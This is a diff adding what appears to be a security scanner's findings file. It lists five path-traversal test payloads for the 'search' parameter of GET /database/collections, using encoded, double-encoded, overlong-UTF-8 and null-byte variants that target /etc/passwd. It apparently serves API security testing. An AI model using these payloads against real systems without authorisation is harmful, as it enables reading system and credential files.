@@ -1,0 +1,30 @@
+API Vul Type: path_traversal
+Vul API Url: /database/collections
+Vul API Method: Get
+API Vul Param: search
+API Test Payload: %2e%2e%2fetc%2fpasswd
+
+API Vul Type: path_traversal
+Vul API Url: /database/collections
+Vul API Method: Get
+API Vul Param: search
+API Test Payload: %252e%252e%252fetc%252fpasswd
+
+API Vul Type: path_traversal
+Vul API Url: /database/collections
+Vul API Method: Get
+API Vul Param: search
+API Test Payload: ..%c0%afetc/passwd
+
+API Vul Type: path_traversal
+Vul API Url: /database/collections
+Vul API Method: Get
+API Vul Param: search
+API Test Payload: /etc/passwd%00
+
+API Vul Type: path_traversal
+Vul API Url: /database/collections
+Vul API Method: Get
+API Vul Param: search
+API Test Payload: ..%2f..%2f..%2fetc%2fpasswd
+
